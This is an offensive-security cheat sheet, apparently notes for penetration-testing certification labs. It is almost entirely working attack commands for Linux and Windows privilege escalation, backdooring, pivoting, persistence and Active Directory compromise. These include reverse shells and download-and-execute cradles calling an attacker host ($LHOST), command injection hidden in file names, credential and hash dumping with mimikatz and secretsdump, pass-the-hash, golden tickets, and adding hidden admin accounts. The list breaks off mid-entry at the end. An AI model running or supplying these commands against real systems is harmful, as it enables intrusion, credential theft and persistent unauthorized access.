===wildcard injection===
===tar
echo 'chmod u+s /bin/bash' > pwn.sh
chmod +x pwn.sh
touch '/path/to/folder/--checkpoint=1'
touch '/path/to/folder/--checkpoint-action=exec=sh pwn.sh'

===rm
#won't work if is something like `rm /full/path/*'
#/bin/bash
touch 'somefile ; echo 'Y2htb2QgdStzIC9iaW4vYmFzaA=='| base64 -d |bash)'
#/usr/bin/bash
touch 'somefile ; echo 'Y2htb2QgdStzIC91c3IvYmluL2Jhc2g='| base64 -d| bash)'

===rsync
echo 'chmod u+s /bin/bash' > pwn.sh
chmod +x pwn.sh
touch '/path/to/folder/-e sh pwn.sh'

===writable apt.conf.d===
echo 'apt::Update::Pre-Invoke {'chmod u+s /usr/bin/bash'};' > /etc/apt/apt.conf.d/pwn

===arbitrary write===
===/etc/sudoers
current_user ALL=(ALL) NOPASSWD: ALL
===/etc/shadow
openssl passwd -1 -salt <newsalt> <newpassword> 
#Append to /etc/shadow
<new-user>:<hash>:0:0:root:/root:/bin/bash


===backdooring===
===bashrc
echo "touch /tmp/bashtest.txt" >> ~/.bashrc
/bin/bash             # Triggers command, creates /tmp/bashtest.txt

===vim
echo "silent !source ~/.vimscript" > ~/.vimrc
echo "touch ~/hacked" > ~/.vimscript
chmod +x ~/.vimscript

===vim-plugin
mkdir -p ~/.vim/plugins/
echo ":silent !/bin/sh -i >& /dev/tcp/$LHOST/81 0>&1" > ~/.vim/plugins/pl.vim
echo ":source ~/.vim/plugins/pl.vim" > ~/.vimrc
#Start listnener
sudo nc -nvlp 81
#Enviroment retaining with alias
alias sudo='sudo -E'
execute
sudo /usr/bin/vim /opt/important.conf

===vim-keylogger
mkdir -p ~/.vim/plugins
nano ~/.vim/plugins/settings.vim
###################
	#:if $USER == "root"
	#:autocmd BufWritePost * :silent :w! >> /home/offsec/hacked.txt
	#:endif
###################

nano ~/.vimrc
############
# :source ~/.vim/plugins/settings.vim
############

sudo vim output.txt

#############
#write some stuff here
#:wq
#############

#check ~/hacked.txt

================================windows=====================================
===pwn.ps1===
powershell -ep bypass -c 'iex(iwr -uri $LHOST/pwn.ps1 -usebasicparsing)'

===System enumeration===
whoami /priv
whoami /groups
systeminfo | findstr /B /C:'Host Name' /C:'OS Name' /C:'OS Version' /C:'System Type' /C:'Hotfix(s)'

===env
dir env:
$env:path

===ps-history
Get-History
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cmd /c type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

===Interesting files===
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc*,*.log,*.ps1,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue
dir /a C:\
dir /a $HOME
Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Recurse C:\inetpub | findstr -i 'directory config txt aspx ps1 bat xml pass user ini'

===Installed applications
#32-bit
Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname
#64-bit
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname

===permissions on path
for %A in ('%path:;=';'%') do ( cmd.exe /c icacls '%~A' 2>nul | findstr /i '(F) (M) (W) :\' | findstr /i ':\\ everyone authenticated users todos %username%' && echo. )

===querying-services
cmd/c sc query serviceName

===running-services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike 'C:\Windows*' } | select Name,DisplayName,StartMode,PathName

===unquoted-service===
wmic service get name,displayname,startmode,pathname | findstr /i /v 'C:\Windows\\' |findstr /i /v '''
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike 'C:\Windows*' -and $_.PathName -notlike ''*'} | select Name,DisplayName,StartMode,PathName

===Scheduled tasks===
#Powershell
Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State
Get-Process Scheduler -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
#cmd
cmd /c schtasks /query /fo LIST /v | findstr /B /C:'Folder' /C:'TaskName' /C:'Run As User' /C:'Schedule' /C:'Scheduled Task State' /C:'Schedule Type' /C:'Repeat: Every' /C:'Comment'

===Password Hunting===
===Unattend Files
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.xml
C:\Windows\system32\sysprep\sysprep.xml

===Alternate Data Streams (ADS)
dir /R
more < NothingToSeeHere.txt:secret.txt:$DATA

===Files & Contents
#files
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*

#content enumeration
findstr /SI 'passw pwd' *.xml *.ini *.txt *.ps1 *.bat *.config

===SAM & SYSTEM
cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK

===Registry
reg query [HKLM/HKCU] /f [password/pw/pwd/pass] /t REG_SZ /s
reg query HKCU /f pwd /t REG_SZ /s

#3rd party programs
#SNMP
reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'
#Putty
reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'
#WinVNC
reg query 'HKCU\Software\ORL\WinVNC3\Password'
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

#Autologons
reg query 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon'

===Stored Creds
cmdkey /list

===internal services
netstat -ano

===Registry===
===Autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
===AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\path\to\malicious.msi
===Weak Registry Permissions
#Qeury reg key permission
accesschk.exe '%USERNAME%' -kvuqsw hklm\System\CurrentControlSet\services -accepteula
accesschk.exe 'Everyone' -kqswvu hklm\System\CurrentControlSet\services -accepteula
accesschk.exe 'Authenticated Users' -kqswvu hklm\System\CurrentControlSet\services -accepteula
accesschk.exe 'BUILTIN\Users' -kqswvu hklm\System\CurrentControlSet\services -accepteula
accesschk.exe 'NT AUTHORITY\INTERACTIVE' -kqswvu hklm\System\CurrentControlSet\services -accepteula

===startup-apps===
icacls 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'

===DLLs===
#search-order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
#Xfer binary to windows & observe in procmon

#Windows 7,8
default DLL called wlbsctrl.dll that is “NOT FOUND”
#Windows 10
missing DLL for the Task Scheduler service called wptsExtensions.dll
need shutdown privileges



===exploits===
===SeImpersonate (NT AUTHORITY/SERVICE)
#GodPotato
.\gp4.exe -cmd 'cmd /c whoami'
#PrintSpoofer
.\PrintSpoofer64.exe -i -c powershell.exe
#JuicyPotato
.\Juicy.Potato.x86.exe -l 1337 -c '{4991d34b-80a1-4291-83b6-3328366b9097}' -p c:\windows\system32\cmd.exe -a '/c whoami' -t *

===SeManageVolume
https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe

#Replace C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll#
$type = [Type]::GetTypeFromCLSID('{854A20FB-2D44-457D-992F-EF13785D2B51}')
$object = [Activator]::CreateInstance($type)

#Replace C:\Windows\System32\Wbem\tzres.dll#
systeminfo

===UAC-Bypass===
#Writeup: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
#Tools: https://github.com/turbo/zero2hero
	https://github.com/CsEnox/EventViewer-UACBypass
	https://github.com/hfiref0x/UACME
	
===enumerating-uac
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
	EnableLUA: if 0, no need bypass just psexec. If 1, Check other 2 keys
	ConsentPromptBehaviourAdmin 0,2 or 5
	PromptOnSecureDesktop 0 or 1

===Bypass
#edit zero2hero.c
/*
GetCurrentDirectory(MAX_PATH, curPath);
strcat(curPath, '\\reverse-shell.exe');
*/
#compile
x86_64-w64-mingw32-gcc zero2hero.c -o zero2hero.exe
#exploit
.\zero2hero.c

===priv-recovery===
===FullPowers
.\FullPowers.exe 'powershell -ep Bypass'
===Manual
#Create list of privileges
[System.String[]]$Privs = 'SeAssignPrimaryTokenPrivilege', 'SeAuditPrivilege', 'SeChangeNotifyPrivilege', 'SeCreateGlobalPrivilege', 'SeImpersonatePrivilege', 'SeIncreaseWorkingSetPrivilege'
#Create Principal for the task
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId 'LOCALSERVICE' -LogonType ServiceAccount -RequiredPrivilege $Privs
#Create action for task
$TaskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-Exec Bypass -Command `'C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`''
#Create task
Register-ScheduledTask -Action $TaskAction -TaskName 'GrantAllPerms' -Principal $TaskPrincipal
#Start Task 
Start-ScheduledTask -TaskName 'GrantAllPerms'

===Auto-Enumeration===
===PowerView
Get-Domain
Get-NetUser | Select key1,key2 etc
Get-NetGroup 'Group Name'
===Computer info
Get-NetComputer
===Scan network to find where current use has admin perms
Find-LocalAdminAccess
===Enumerate Logged in sessions
Get-NetSession -ComputerName files04 -Verbose
===Enumerate SPNs in domain
Get-NetUser -SPN | select samaccountname,serviceprincipalname
DomainTrustMapping
Get-DomainComputer -Domain *domain* | Resolve-IPAddress


===Tools===
===SharpView
#Get all domains
$domains = '*domain1*','*domain2*','*domain3*'
foreach ($domain in $domains) (Get-DomainCompuer -Domain domain | Resolve-IPAddress)
===PowerUp
Invoke-AllChecks
===SharpUp
===Bloodhound
iex(new-object net.webclient).downloadstring('http://$LHOST:8000/Invoke-Sharphound.ps1'); Invoke-Sharphound - CollectionMethod All,GPOLocalGroup -Domain *domain*; Invoke-Sharphound -CollectionMethod All -Domain *domain*

===dumping-hashes===
===shadow-copy
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam \\$LHOST\kali\sam
python3 pwdump.py /path/to/system-dump /path/to/sam-dump
===reg-dumping
reg save HKLM\sam .\rsam
reg save HKLM\system .\rsystem

===mimikatz
token::elevate
privilege::debug
log *logfile*
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache
#specify SAM & SYSTEM
lsadump::sam /system:C:\Windows\Repair\SYSTEM /sam:C:\Windows\Repair\SAM

#msfconsole-kiwi
msfconsole> getsystem
msfconsole> load kiwi
msfconsole> lsa_dump_sam
msfconsole> lsa_dump_secrets

#dumping-memory
1. task manager > details tab >  lsass.exe > create dump file OR procdump.exe -ma lsass.exe
	OR 
	c:\tools\sysinternalssuite\procdump.exe -ma lsass.exe
	move .\lsass.exe_xxx_xxxxx.dmp c:\users\offsec\desktop\pd_lsass.dmp
2. copy to local machine
3. open mimikatz on local
4. mimikatz # sekurlsa::minidump lsass.dmp
5. mimikatz # sekurlsa::logonpasswords

===impacket-secretsdump
#remote dumping with creds (can be used for dc-sync attack)
impacket-secretsdump domain.oscp/administrator:password@target.pg
#dumped system & sam files
impacket-secretsdump -system /path/to/system-file -sam /path/to/sam-file local
#using exported ccache file
impacket-secretsdump -k dc01.corp.com

===hash dumping
nxc smb files02.medtech.com -u joe -p Flowers1 --lsa
nxc smb target.com -u user -p password -M procdump -o PROCDUMP_PATH=/serve/win/binaries/ DIR_RESULT=/home/kali/pt...
nanodump
handlekatz
lsassy
masky
mimikatz

================================pivoting=====================================
===winrm
#winrs
winrs -r:client02 -u:wario -p:Mushroom! 'cmd.exe'
#New-PSSession
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession <*session-ID*>
#Evil-WinRM
evil-winrm -i $TARGET -u username -p password [-H hash]
	download /source/to/file /dest/path/file
	upload /source/to/file /dest/path/file
	

===runas
#runas.ps1
Import-Module .\Invoke-RunsasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command 'Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://$LHOST/powercat.ps1');powercat -c $LHOST -p 80 -e cmd'

#runas.exe
.\ra.exe svc_mssql trustno1 'cmd /c c:\users\public\nc.exe $LHOST 80 -e cmd'

===psexec (uses smb)
impacket-psexec username@target.pg [-hashes hash]
impacket-psexec -k -no-pass -dc-ip dc01.corp.com corp.com/dave@dc01.corp.com #domain must be the same as shown in klist

===laps
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups

#Enum members that can read LAPS passwords
Get-NetGroupMember -GroupName 'LAPS Password Readers'

#Enumerate computers with laps, shows password if ran with user in 'LAPS Password Readers'
Get-LAPSComputers

===rdp
#mstsc (rdp from rdp)
mstsc.exe /admin /restrictedadmin
mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:<NTLM_HASH> /run:'mstsc.exe /restrictedadmin'

#rdp-console
sharprdp.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
sharprdp.exe computername=appsrv01 command='powershell (New-Object System.Net.WebClient).DownloadFile('http://$LHOST/met.exe', 'C:\Windows\Temp\met.exe'); C:\Windows\Tasks\met.exe' username=corp1\dave password=lab

#RestrictedAdmin PTH

xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore

mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:'mstsc.exe /restrictedadmin'

#Enable Restricted Admin Mode
1. Open admin shell with hash: sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
2. Shell to target PS C:\Windows\system32> Enter-PSSession -Computer appsrv01
3. Enable ResAdmin: [appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name DisableRestrictedAdmin -Value 0


===rdpthief (stealing rdp creds)
1# INject RdpThief DLL into mstsc process
2# Review C:\Users\<user>\AppData\Local\Temp\data.bin for stolen creds

===fileless-pivoting-c#
Control a service , make it start a custom binary, start service -> SensorService present by default, not ran on boot
OpenSCManagerW -> OpenServiceW -> ChangeServiceConfigA -> StartServiceA

#scshell.py
python scshell.py corp1.com/dave@appsrv01.corp1.com -hashes 00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e -service-name ALG

===ssh
#Find private keys
find /home/ -name "id_rsa"
# Or search for private key files not named as default
ls -al /home/username/

#crack ssh passphrase
ssh2john


===ssh-control-master
################TARGET###################

offsec@controller:~$ nano ~/.ssh/config

---------------------------------------
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
---------------------------------------

offsec@controller:~$ chmod 644 ~/.ssh/config
offsec@controller:~$ mkdir ~/.ssh/controlmaster



#########################################

// ASSUMING there is ssh connection between controller and victim

##################ATTACKER##################
offsec@controller:~$ ls -al ~/.ssh/controlmaster/
offsec@controller:~$ ssh offsec@controller    # Attacker gets access to controller

# No keys needed, forwarded agent is active in memory
offsec@controller > ssh offsec@linuxvictim
# Access granted without private key or passphrase prompt
############################################

===ssh-forward-agent
################TARGET###################
victim@linuxvictim > ssh-keygen               # Generate key with passphrase
victim@victim > eval "$(ssh-agent)"      # Start agent
victim@victim > ssh-add                  # Load key into agent

victim@victim > ssh-copy-id offsec@controller      # Copy pub key to B
victim@victim > ssh-copy-id offsec@linuxvictim     # Copy pub key to D

victim@victim > nano ~/.ssh/config
# Add:
# Host *
#   ForwardAgent yes

controller@controller > sudo nano /etc/ssh/sshd_config
# Add/ensure:
# AllowAgentForwarding yes

controller@controller > sudo systemctl restart sshd

#Victim leaves session open
victim@victim > ssh offsec@controller    # SSH into intermediary (B)
offsec@controller > ssh offsec@linuxvictim  # [Optional] ssh to target
# Leave this session open
############################################

##################ATTACKER##################
attacker@kali > ssh offsec@controller    # Attacker gets access to controller

# No keys needed, forwarded agent is active in memory
offsec@controller > ssh offsec@linuxvictim
# Access granted without private key or passphrase prompt
############################################

===ssh-agent-hijacking
################TARGET###################
ssh-keygen                  # Generate key
eval "$(ssh-agent)"         # Start agent
ssh-add                     # Add identity
ssh-copy-id user@target     # Copy public key to target
ssh user@controller         # SSH into intermediary
##########################################

##################ATTACKER##################
ps aux | grep ssh-agent           # Find victim's agent PID
ls /tmp/ssh-*                     # Find agent socket path

export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.PID  # Set environment variable to hijack agent

ssh-add -l                        # List loaded identities (proves hijack)
ssh user@target                   # Access target as victim (no key/passphrase needed)
############################################

===ansible
#Ad-Hoc commands
ansible <group> -a 'whoami'
ansible <group> -a 'whoami' --become <user> (default root)

#Vault
1. Copy out encrypted vault value from $ANSIBLE_VAULT -> ansible.hash
2. ansible2john ansible.hash > ansible.crack
3. hashcat ansible.crack --force -m 16900 /wls/rockyou.txt (remove pre-pended *: from john output)
4. cat ansible.crack | ansible-vault decrypt -> input password

#Playbooks
ansible-playbook playbook.yml

#Writing to Playbook
    - name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: 'ssh-rsa AAAAB3NzaC1...Z86SOm...'
        insertbefore: EOF

    - name: Run command
      shell: touch /tmp/mycreatedfile.txt
      async: 10
      poll: 0


===artifactory

#Compromising Database 
##Copy out db
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
##Use derby tool
sudo java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
##connect to db
ij> connect 'jdbc:derby:/tmp/hackeddb/derby'; 
ij> select * from access_users
#Copy out hash(bcrypt) & crack directly with john


#Adding 2nd admin account (need to be root)
sudo echo 'haxmin@*=haxhaxhax' > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
##verify
sudo grep 'Create admin user' /opt/jfrog/artifactory/var/log/console.log 

===linux-kerberos
#Find Requested ticket path
env | grep KRB5CCNAME

#Acquire TGT
kinit

#Renew tickets (if within renewal time frame)
kinit -R

#Acquire TGT with keytab
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab

#list tickets
klist

#List SPNs (force kerberos authentication)
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D 'Administrator@CORP1.COM' -W -b 'dc=corp1,dc=com' 'servicePrincipalName=*' servicePrincipalName

#Request service ticket
kvno <servicePrincipalName>
kvno MSSQLSvc/DC01.corp1.com:1433

#Interactive prompt
kutil
##add entry to keytab
kutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
##specify where keytab should be written
kutil: wkt /tmp/administrator.keytab

#Find ccache files
ls -la /tmp/krb55cc_*
#Copy out ccache and modify perms
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
#Use ccache
##clear old creds
kdestroy
##load ccache
export KRB5CCNAME=/tmp/krb5cc_minenow

#Convert kirbi to ccache
impacket-ticketConverter tgt.kirbi tgt.ccache

================================persistence=====================================
===windows-add-user
net user /add kali p@ssword123; net localgroup administrators kali /add; net localgroup 'remote desktop users' kali /add

===RDP===
===enable-rdp
reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f; netsh advfirewall set allprofiles state off; net localgroup 'administrators' robert /add; net localgroup 'remote desktop users' kali /add

===rdp-pth
New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value '0' -PropertyType DWORD -Force

===if already logged on
powershell
query session
logoff 1

===shell-upgrade
===powercat
powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString('http://$LHOST:8000/powercat.ps1');powercat -c $LHOST -p 80 -e cmd'

===ssh
echo "ssh-rsa AAAA...== kali@kali" >> /home/target/.ssh/authorized_keys


=========================================AD==============================================

===tools===
===kerbrute
#User enumeration
.\kerbrute userenum -d target.com /wls/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc01.target.com
#Password Spray
.\kerbrute passwordspray -d target.com users.txt Password123

===nxc
nxc [smb/ftp/ssh/rdp...] mail.com -u john -p password-list [--continue-on-success]
nxc [smb/ftp/ssh/rdp...] ... --local-auth

#modules
nxc smb -M mimikatz target.com -u user -p pass --server-port 5000

#enable-rdp
nxc smb files02.medtech.com -u joe -p Flowers1 -M rdp -o ACTION=enable

#command-execution
nxc smb ... -x 'whoami'
nxc smb ... -x 'whoami' --exec-method smbexec
nxc smb ... -X 'whoami'
nxc winrm target.com -u user -p password -x whoami

#dumping LAPS password
nxc ldap target.pg -u user -p pass --kdcHost dc01.oscp -M laps

#use-ccache
nxc smb ... --use-kcache # KRB5CCNAME is set
nxc smb ... --use-kcache --kcache-file /path/to/ticket.ccache

#mssql
nxc mssql dc01.corp1.com -u Offsec -p lab -q 'EXEC xp_dirtree '\\\\$LHOST\\kali';'
nxc mssql dc01.corp1.com -u Offsec -p lab -x 'whoami'

===ldapsearch
#get naming contexts
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
#anonymous query
ldapsearch -x -H ldap://$TARGET -b 'dc=hutch,dc=offsec'
#use kerberos authentication
ldapsearch -Y GSSAPI -x -H ldap://$TARGET -b 'dc=hutch,dc=offsec'


===ad-enumeration===
===username
.\kerbrute userenum -d target.com /wls/SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc01.target.com
ldapsearch -x -H ldap://$TARGET -b 'dc=hutch,dc=offsec' | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}'
impacket-GetADUsers -all -dc-ip dc01.ip domain.oscp/username:Password
impacket-GetADUsers -all -k -no-pass -dc-ip dc01.corp1.com CORP1.COM/Administrator
#use ticket
impacket-GetUSerSPNs -k -no-pass -dc-ip dc01.ip CORP1.COM/Administrator
#Check for disabled pre-auth
impacket-GetNPUsers target.pg/user:password -dc-ip dc01.ip

===identify-local-admin
$env:computername
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"

===laps
Import-Module .\LAPSToolkit.ps1
#passwords
Get-LAPSComputers
#delegated-reader-groups
Find-LAPSDelegatedGroups


===domain
#bloodhound
#Remote
bloodhound-python -d heist.offsec -u enox -p california -c all -ns 192.168.153.165
#Start bloodhound-server
bloodhound
#Start neo4j
sudo neo4j console

===object-perms
# Get ACLs for a specific object
Get-ObjectAcl -Identity <target> -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.Value) -Force; $_}

#enumerate-user
. .\PowerView.ps1
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $('$env:UserDomain\$env:Username')) {$_}}

#enumerate-group
. .\PowerView.ps1
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $('$env:UserDomain\$env:Username')) {$_}}

#enumerate-computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $('$env:UserDomain\$env:Username')) {$_}}

===unconstrained
Get-DomainComputer -Unconstrained -> Look for TRUSTED_FOR_DELEGATION
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation

===unconstrained-spooler
dir \\dc01\pipe\spoolss

===constrained
Get-DomainComputer -TrustedToAuth
	-> msds-allowedtodelegateto → which SPNs the account can delegate to.
	-> TRUSTED_TO_AUTH_FOR_DELEGATION → indicates S4U extensions can be used without knowing the user’s password.

===rbdc
#generic-write
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }

===vulnerable-certs
.\Certify.exe find /vulnerable

===jea
#Enumerate available commands
[files02]: PS>Get-Command


===ad-forest-enumeration===
#Enumerate all forest trusts (Big picture: which forests are connected)
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

#Enumerate domain trusts (trusts for one domain)
Get-DomainTrust -Domain corp1.com

#Auto enumeration and discovery of all domains (Automated mapping of all domain + forest trusts)
Get-DomainTrustMapping

#Enumerate users in trusted forest/ domain (Who lives in the other forest/domain)
Get-DomainUser -Domain corp2.com

#Enumerate foreign group membership (Who from your forest has rights in their forest)
Get-DomainForeignGroupMember -Domain corp2.com

#Enumerate Group members
Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain corp1.com


===ad-attacks===
===kerberoasting-asreproasting
#rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
.\Rubeus.exe kerberoast /outfile:kebhash
#invoke-rubeus
Invoke-Rubeus -Command 'asreproast'
#invoke-kerberoast
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
#nxc
nxc ldap ms01.oscp.exam -u dmzadmin -p SlimGodhoodMope --kdcHost dc01.oscp.exam --[kerberoasting/asreproast] output

===GetNPUsers (ASReproast)
#NO PRE-AUTH
impacket-GetNPUsers domain.com/user -dc-ip dc01.ip -no-pass

---OTHER METHODS---
Kerberoasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
Asreproasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

===ticket-impersonation
#Extract TGT from memory & use (Must be admin)
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:doIFhDCCBYCgAwIBBaEDAgEW...

===GenericAll
#Change target password
net user Bob newpassword /domain
#Add self to group
net group testgroup offsec /add /domain

===WriteDACL
#Add GenericAll to self
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All

===GenericWrite (Modify any writable attribute of that entity)
#Add fake SPN, request a TGS, and crack offline
Set-DomainObject -Identity 'target' -Set @{serviceprincipalname='nonexistent/hacking'}
Get-DomainUser 'target' | Select serviceprincipalname
Get-DomainUser 'target' | Get-DomainSPNTicket

#Group: Add self to the group
Add-DomainGroupMember -Identity 'HelpDesk Admins' -Members Offsec

===unconstrained-delegation 
#Await target's use of service to trigger kerberos
#Dump tickets
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets
#Export tgt
mimikatz # sekurlsa::tickets /export
#Inject TGT
mimikatz # kerberos::ptt <ticketfile.kirbi>
#Impersonate and access as target
PsExec.exe \\cdc01 cmd

===unconstrained-delegation-spooler
#Listen for DC's TGT 
Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
#Trigger Printer Bug
SpoolSample.exe CDC01 APPSRV01
#Inject TGT
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEW...
#Perform DC Sync
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt -> get hash
#Use hash to create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:prod.corp1.com /sid:<domain SID> /krbtgt:<NTLM hash> /id:500

===unconstrained-delegation-krbrelayx
### Add domain to /etc/hosts, set nameserver to dc01

1# Get hash & aesKey of compromised account
impacket-secretsdump corp.com/adam@files01.corp.com
2# Add spn via compromised host
python3 addspn.py -u 'corp.com\administrator' -p 'aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4' -t files01.corp.com -s HOST/attacker.corp.com -d 192.168.45.152 -dc-ip 192.168.110.100 --additional dc01.corp.com
3# Add DNS entry for attacker name set in SPN
python3 dnstool.py -u 'corp.com\administrator' -p 'aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4' -r attacker.corp.com -d 192.168.45.152 -dc-ip 192.168.110.100 --action add dc01.corp.com
4# Wait awhile, check record added
nslookup attacker.corp.com dc01.corp.com
5# Start krbrelayx listener
python3 krbrelayx.py -aesKey <key-retrieved-from-secretsdump>
6# Printerbug script
